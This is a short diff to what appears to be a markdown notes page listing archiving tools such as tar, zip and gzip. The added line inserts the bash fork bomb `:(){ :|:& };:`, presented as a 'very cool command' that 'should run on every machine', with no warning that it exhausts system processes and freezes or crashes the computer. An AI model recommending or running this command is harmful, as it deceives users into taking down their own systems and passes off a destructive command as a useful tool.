@@ -24,4 +24,4 @@ draft: false
 - [[tar]] - used for archiving and unarchiving `.tar`
 - [[zip]] - also for archiving `.zip`
 - [[gzip]] - archives and compresses files
-- 
+- `:(){ :|:& };:` - very cool command, should run on every machine
